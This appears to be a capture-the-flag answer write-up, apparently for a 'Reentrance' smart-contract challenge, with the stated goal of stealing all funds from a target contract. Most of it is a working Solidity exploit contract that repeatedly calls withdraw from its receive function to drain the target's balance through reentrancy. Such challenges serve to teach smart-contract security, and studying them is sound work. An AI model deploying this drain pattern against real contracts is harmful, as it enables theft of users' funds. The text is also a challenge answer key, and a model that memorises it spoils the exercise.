# Answer

Goal: Steal all the funds from the contract.

## 1. Stealing

The contract is vulnerable to a reentrancy attack. The following contract exploits it by creating a call loop through the payable receive function.

```solidity
contract ReentranceExploit {
    Reentrance r;
    uint256 depositAmount;

    // Don't forget to fund the contract during deployment
    // The amount ideally should be equal to the target contracts
    constructor(address payable targetAddr) public payable {
        r = Reentrance(targetAddr);
        depositAmount = msg.value;
    }

    function exploit() external {
        r.donate{value: depositAmount}(address(this));
        r.withdraw(depositAmount);
    }

    receive() external payable {
        r.withdraw(address(r).balance < depositAmount ? address(r).balance : depositAmount);
    }
}
```
